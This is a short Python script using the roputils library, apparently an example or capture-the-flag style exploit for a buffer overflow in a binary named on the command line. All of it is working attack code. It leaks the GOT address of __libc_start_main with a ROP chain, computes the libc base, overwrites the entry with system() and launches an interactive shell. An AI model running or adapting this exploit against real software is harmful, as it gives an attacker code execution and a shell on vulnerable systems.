from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
libc = ROP('/lib/x86_64-linux-gnu/libc.so.6')

got_start = rop.got('__libc_start_main')

buf = rop.retfill(offset)
buf += rop.call_chain_ptr(
    ['write', 1, got_start, 8],
    ['read', 0, got_start, 12],
    ['__libc_start_main', got_start+8]
)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p64()
libc.set_base(ref_addr, '__libc_start_main')

buf = rop.p(libc.addr('system'))
buf += 'sh #'

p.write(buf)
p.interact(0)
